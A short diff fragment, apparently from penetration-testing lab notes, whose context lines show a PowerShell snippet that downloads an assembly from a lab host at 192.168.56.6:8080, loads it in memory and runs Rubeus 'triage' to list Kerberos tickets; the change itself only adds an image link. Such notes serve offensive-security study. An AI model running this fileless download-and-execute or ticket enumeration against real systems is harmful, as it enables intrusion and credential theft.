@@ -16,3 +16,4 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.6:8080
 $assem = [System.Reflection.Assembly]::Load($data);
 [Rubeus.Program]::MainString("triage");
 ```
+![[Pasted image 20230911105711.png]]
